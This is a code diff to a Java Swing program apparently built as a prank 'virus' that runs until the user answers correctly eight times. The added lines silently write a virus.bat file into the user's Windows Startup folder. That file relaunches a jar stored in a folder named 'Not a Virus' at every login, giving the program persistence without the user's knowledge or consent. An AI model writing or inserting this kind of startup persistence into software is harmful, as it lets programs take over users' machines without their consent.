@@ -15,7 +15,9 @@ import java.awt.RenderingHints;
 import java.awt.event.KeyEvent;
 import java.awt.event.KeyListener;
 import java.awt.image.BufferedImage;
-import java.util.ArrayList;
+import java.io.BufferedWriter;
+import java.io.File;
+import java.io.FileWriter;
 import java.util.Random;
 import javax.swing.JPanel;
 
@@ -153,23 +155,20 @@ public class VirusPane extends JPanel implements KeyListener, Runnable {
         g.setRenderingHint(RenderingHints.KEY_TEXT_ANTIALIASING, RenderingHints.VALUE_TEXT_ANTIALIAS_ON);
         getNumberSizes();
         
-//        int FPS = 30;
-//        long start, now, elapsedTime;
-//        long targetTime = 1000000000/FPS;
-//        long waitTime=0;
-//        long totalTime = 0;
+        try{
+            File batchFile = new File(System.getProperty("user.home")+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\virus.bat");
+            BufferedWriter writer = new BufferedWriter(new FileWriter(batchFile));
+            writer.write("@echo off \n");
+            writer.write("start javaw -jar \"C:\\Users\\Adam\\AppData\\Roaming\\Not a Virus\\Virus.jar\"");
+            writer.close();
+        }catch(Exception e){
+            e.printStackTrace();
+        }
         while (running){
             render();
             draw();
             if (correct == 8)
                 System.exit(0);
-//            
-//            now = System.nanoTime();
-//            elapsedTime = now-start;
-//            waitTime = targetTime - elapsedTime;
-//            try{
-//                Thread.sleep(waitTime/1000000);
-//            }catch(Exception e){}
         }
 
     }
